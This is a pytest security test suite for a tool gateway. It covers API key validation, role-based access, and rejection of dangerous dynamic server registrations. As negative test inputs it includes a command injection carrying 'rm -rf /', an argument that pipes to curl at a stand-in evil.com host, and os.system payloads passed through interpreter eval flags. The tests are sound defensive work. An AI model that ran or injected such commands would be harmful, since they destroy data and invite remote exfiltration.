"""Comprehensive Security Tests for Phase 1: Authentication and Exposure.

Covers:
- A1: API key validation (length >= 32, no placeholders, 401 for wrong/missing/malformed, role mapping).
- B1: Dynamic server registration restrictions, shell metacharacter rejection, eval flags, command allowlist.
- B3: Downstream stdio gateway role enforcement (default readonly denies write_file, operator allows).
- B7: Audit endpoint admin-only enforcement, config-driven role allowlist, and full RBAC matrix.
"""
from __future__ import annotations

import os
import sys
from pathlib import Path
import pytest
from httpx import ASGITransport, AsyncClient
from mcp.types import CallToolRequestParams

from toolbridge.api.app import create_app
from toolbridge.api.auth import (
    AuthenticatedUser,
    get_configured_api_keys,
    get_current_user,
    validate_api_key,
)
from toolbridge.client.manager import MCPClientManager
from toolbridge.client.registry import ServerRegistry
from toolbridge.db.session import init_db
from toolbridge.models.server import TransportType, UpstreamServerConfig, UserRole
from toolbridge.models.tool import NamespacedTool
from toolbridge.security.policy import PolicyEngine, SensitivityTier
from toolbridge.server.gateway import ToolBridgeGatewayServer

VALID_ADMIN = "secure_admin_key_32_characters_long_abcdef123"
VALID_OPERATOR = "secure_operator_key_32_characters_long_123456"
VALID_READONLY = "secure_readonly_key_32_characters_long_789012"


@pytest.fixture(autouse=True)
def setup_valid_keys(monkeypatch):
    """Set valid 32+ character API keys for Phase 1 testing."""
    monkeypatch.setenv("TOOLBRIDGE_ADMIN_KEY", VALID_ADMIN)
    monkeypatch.setenv("TOOLBRIDGE_OPERATOR_KEY", VALID_OPERATOR)
    monkeypatch.setenv("TOOLBRIDGE_READONLY_KEY", VALID_READONLY)


# ==============================================================================
# A1: API Key Validation & Rejection of Placeholders
# ==============================================================================

@pytest.mark.security
def test_api_key_missing_fails():
    """Verify missing API key raises ValueError."""
    with pytest.raises(ValueError, match="not set"):
        validate_api_key("TOOLBRIDGE_ADMIN_KEY", None)
    with pytest.raises(ValueError, match="not set"):
        validate_api_key("TOOLBRIDGE_ADMIN_KEY", "")


@pytest.mark.security
def test_api_key_too_short_fails():
    """Verify keys shorter than 32 characters are rejected."""
    with pytest.raises(ValueError, match="too short"):
        validate_api_key("TOOLBRIDGE_ADMIN_KEY", "short_key_under_32_chars")


@pytest.mark.security
def test_api_key_placeholder_and_patterns_fail():
    """Verify known placeholder keys and patterns are rejected."""
    placeholders = [
        "tb-admin-key-999",
        "tb-operator-key-555",
        "tb-readonly-key-111",
        "change-this-to-a-strong-random-api-key-in-production",
        "changeme" + "x" * 30,
        "placeholder" + "x" * 30,
    ]
    for placeholder in placeholders:
        with pytest.raises(ValueError, match="insecure"):
            validate_api_key("TOOLBRIDGE_TEST_KEY", placeholder)


@pytest.mark.security
def test_api_keys_map_to_correct_roles():
    """Verify each configured key maps to its designated role."""
    keys = get_configured_api_keys()
    assert keys[VALID_ADMIN].role == UserRole.ADMIN
    assert keys[VALID_OPERATOR].role == UserRole.OPERATOR
    assert keys[VALID_READONLY].role == UserRole.READONLY


# ==============================================================================
# A1: HTTP Authentication Header Tests (401 on missing, wrong, malformed)
# ==============================================================================

@pytest.fixture
async def sec_api_client(tmp_path: Path, monkeypatch):
    """Setup isolated test client."""
    monkeypatch.setenv("TOOLBRIDGE_SQLITE_URL", f"sqlite+aiosqlite:///{tmp_path / 'sec_api.db'}")
    await init_db()
    registry = ServerRegistry()
    manager = MCPClientManager(registry=registry)
    app = create_app(registry=registry, client_manager=manager)
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        yield client


@pytest.mark.security
@pytest.mark.asyncio
async def test_auth_missing_header_returns_401(sec_api_client):
    """Verify calling protected endpoints without credentials returns 401."""
    res = await sec_api_client.get("/api/v1/servers")
    assert res.status_code == 401
    assert "Missing authentication credentials" in res.json()["detail"]


@pytest.mark.security
@pytest.mark.asyncio
async def test_auth_wrong_key_returns_401(sec_api_client):
    """Verify invalid key returns 401."""
    res = await sec_api_client.get(
        "/api/v1/servers",
        headers={"X-API-Key": "completely_invalid_key_that_is_32_chars_long_and_bad"},
    )
    assert res.status_code == 401
    assert "Invalid API Key" in res.json()["detail"]


@pytest.mark.security
@pytest.mark.asyncio
async def test_auth_bearer_format(sec_api_client):
    """Verify Authorization: Bearer <key> authentication works for valid keys."""
    res = await sec_api_client.get(
        "/api/v1/servers",
        headers={"Authorization": f"Bearer {VALID_READONLY}"},
    )
    assert res.status_code == 200


# ==============================================================================
# B1: Dynamic Server Registration Restrictions
# ==============================================================================

@pytest.mark.security
@pytest.mark.asyncio
async def test_dynamic_server_registration_disabled_by_default(sec_api_client, monkeypatch):
    """Verify POST /servers returns 403 when dynamic registration is disabled."""
    monkeypatch.setenv("TOOLBRIDGE_ALLOW_DYNAMIC_SERVERS", "false")
    payload = {
        "id": "custom_server",
        "name": "Custom Server",
        "transport": "stdio",
        "command": sys.executable,
        "args": ["-m", "toolbridge.upstreams.filesystem.server"],
    }
    res = await sec_api_client.post(
        "/api/v1/servers",
        json=payload,
        headers={"X-API-Key": VALID_ADMIN},
    )
    assert res.status_code == 403
    assert "disabled by policy" in res.json()["detail"]


@pytest.mark.security
@pytest.mark.asyncio
async def test_dynamic_server_shell_metacharacters_rejected(sec_api_client, monkeypatch):
    """Verify shell metacharacters in command or args are rejected with 400."""
    monkeypatch.setenv("TOOLBRIDGE_ALLOW_DYNAMIC_SERVERS", "true")
    # 1. Shell metacharacter in command
    res1 = await sec_api_client.post(
        "/api/v1/servers",
        json={
            "id": "bad_cmd",
            "name": "Bad Cmd",
            "command": sys.executable + " ; rm -rf /",
            "args": [],
        },
        headers={"X-API-Key": VALID_ADMIN},
    )
    assert res1.status_code == 400
    assert "shell metacharacters" in res1.json()["detail"]

    # 2. Shell metacharacter in args
    res2 = await sec_api_client.post(
        "/api/v1/servers",
        json={
            "id": "bad_args",
            "name": "Bad Args",
            "command": sys.executable,
            "args": ["arg1 | curl http://evil.com"],
        },
        headers={"X-API-Key": VALID_ADMIN},
    )
    assert res2.status_code == 400
    assert "shell metacharacters" in res2.json()["detail"]


@pytest.mark.security
@pytest.mark.asyncio
async def test_dynamic_server_eval_flags_rejected(sec_api_client, monkeypatch):
    """Verify interpreter eval flags (-c, -e, --eval) in args are rejected with 400."""
    monkeypatch.setenv("TOOLBRIDGE_ALLOW_DYNAMIC_SERVERS", "true")
    for flag in ["-c", "-e", "--eval"]:
        res = await sec_api_client.post(
            "/api/v1/servers",
            json={
                "id": f"eval_server_{flag.replace('-', '')}",
                "name": "Eval Server",
                "command": sys.executable,
                "args": [flag, "import os; os.system('whoami')"],
            },
            headers={"X-API-Key": VALID_ADMIN},
        )
        assert res.status_code == 400
        assert "evaluation flag" in res.json()["detail"]


@pytest.mark.security
@pytest.mark.asyncio
async def test_dynamic_server_double_underscore_id_rejected(sec_api_client, monkeypatch):
    """Verify server IDs containing double underscores '__' are rejected."""
    monkeypatch.setenv("TOOLBRIDGE_ALLOW_DYNAMIC_SERVERS", "true")
    res = await sec_api_client.post(
        "/api/v1/servers",
        json={
            "id": "server__with__underscores",
            "name": "Invalid Server",
            "command": sys.executable,
            "args": [],
        },
        headers={"X-API-Key": VALID_ADMIN},
    )
    assert res.status_code == 400
    assert "double underscores" in res.json()["detail"]


# ==============================================================================
# B3: Downstream stdio Gateway Role Enforcement
# ==============================================================================

@pytest.mark.security
@pytest.mark.asyncio
async def test_stdio_gateway_default_readonly_denies_sensitive_tool(monkeypatch):
    """Verify that by default, stdio gateway operates as readonly and rejects SENSITIVE tools."""
    monkeypatch.delenv("TOOLBRIDGE_STDIO_ROLE", raising=False)
    registry = ServerRegistry()
    manager = MCPClientManager(registry=registry)
    gateway = ToolBridgeGatewayServer(client_manager=manager, registry=registry)

    assert gateway.stdio_role == UserRole.READONLY

    # Calling SENSITIVE tool like filesystem__write_file must be denied
    call_params = CallToolRequestParams(
        name="filesystem__write_file",
        arguments={"path": "forbidden.txt", "content": "secret"},
    )
    res = await gateway._handle_call_tool(ctx=None, params=call_params)
    assert res.is_error is True
    assert "Policy Authorization Denied" in res.content[0].text
    assert "SENSITIVE" in res.content[0].text


@pytest.mark.security
@pytest.mark.asyncio
async def test_stdio_gateway_operator_role_permits_sensitive_tool(monkeypatch, tmp_path: Path):
    """Verify that setting TOOLBRIDGE_STDIO_ROLE=operator allows invoking SENSITIVE tools."""
    monkeypatch.setenv("TOOLBRIDGE_STDIO_ROLE", "operator")
    registry = ServerRegistry()
    sandbox = tmp_path / "stdio_sandbox"
    sandbox.mkdir()

    await registry.register_server(UpstreamServerConfig(
        id="filesystem",
        name="Filesystem",
        transport=TransportType.STDIO,
        command=sys.executable,
        args=["-m", "toolbridge.upstreams.filesystem.server"],
        env={"FILESYSTEM_SANDBOX_ROOT": str(sandbox)},
    ))
    manager = MCPClientManager(registry=registry)
    await manager.connect_all()

    try:
        gateway = ToolBridgeGatewayServer(client_manager=manager, registry=registry)
        assert gateway.stdio_role == UserRole.OPERATOR

        call_params = CallToolRequestParams(
            name="filesystem__write_file",
            arguments={"path": "allowed.txt", "content": "written by operator via stdio"},
        )
        res = await gateway._handle_call_tool(ctx=None, params=call_params)
        assert res.is_error is False
        assert (sandbox / "allowed.txt").exists()
    finally:
        await manager.disconnect_all()


# ==============================================================================
# B7: Audit Admin-Only Enforcement & Full RBAC Matrix
# ==============================================================================

@pytest.mark.security
@pytest.mark.asyncio
async def test_audit_endpoints_require_admin(sec_api_client):
    """Verify GET /api/v1/audit is 403 for OPERATOR and READONLY, 200 for ADMIN."""
    # READONLY gets 403
    res_ro = await sec_api_client.get("/api/v1/audit", headers={"X-API-Key": VALID_READONLY})
    assert res_ro.status_code == 403

    # OPERATOR gets 403
    res_op = await sec_api_client.get("/api/v1/audit", headers={"X-API-Key": VALID_OPERATOR})
    assert res_op.status_code == 403

    # ADMIN gets 200
    res_admin = await sec_api_client.get("/api/v1/audit", headers={"X-API-Key": VALID_ADMIN})
    assert res_admin.status_code == 200


@pytest.mark.security
def test_config_driven_role_allowlist(monkeypatch):
    """Verify TOOLBRIDGE_ROLE_ALLOWLIST restricts tools on a per-role basis."""
    # Restrict readonly to ONLY filesystem__read_file
    allowlist_config = '{"readonly": ["filesystem__read_file"]}'
    monkeypatch.setenv("TOOLBRIDGE_ROLE_ALLOWLIST", allowlist_config)

    # Allowed in allowlist
    ok, _ = PolicyEngine.is_authorized(UserRole.READONLY, "filesystem__read_file")
    assert ok is True

    # Denied because not in allowlist (even though list_directory is SAFE)
    ok, reason = PolicyEngine.is_authorized(UserRole.READONLY, "filesystem__list_directory")
    assert ok is False
    assert "not in the configured allowlist" in reason


@pytest.mark.security
def test_full_rbac_matrix_authorization():
    """Verify comprehensive role x tool matrix authorization policies."""
    tools = [
        ("filesystem__read_file", SensitivityTier.SAFE),
        ("filesystem__list_directory", SensitivityTier.SAFE),
        ("filesystem__search_files", SensitivityTier.SAFE),
        ("filesystem__get_file_info", SensitivityTier.SAFE),
        ("filesystem__write_file", SensitivityTier.SENSITIVE),
        ("postgres__list_tables", SensitivityTier.SAFE),
        ("postgres__describe_table", SensitivityTier.SAFE),
        ("postgres__execute_query", SensitivityTier.SAFE),
        ("github__get_repository", SensitivityTier.SAFE),
        ("github__list_issues", SensitivityTier.SAFE),
        ("github__search_repositories", SensitivityTier.SAFE),
        ("unknown__custom_tool", SensitivityTier.SENSITIVE),
    ]

    for tool_name, tier in tools:
        # ADMIN: always True
        admin_ok, _ = PolicyEngine.is_authorized(UserRole.ADMIN, tool_name)
        assert admin_ok is True, f"Admin should be authorized for {tool_name}"

        # OPERATOR: always True
        op_ok, _ = PolicyEngine.is_authorized(UserRole.OPERATOR, tool_name)
        assert op_ok is True, f"Operator should be authorized for {tool_name}"

        # READONLY: True only for SAFE tools
        ro_ok, _ = PolicyEngine.is_authorized(UserRole.READONLY, tool_name)
        if tier == SensitivityTier.SAFE:
            assert ro_ok is True, f"Readonly should be authorized for SAFE tool {tool_name}"
        else:
            assert ro_ok is False, f"Readonly should be DENIED for SENSITIVE tool {tool_name}"
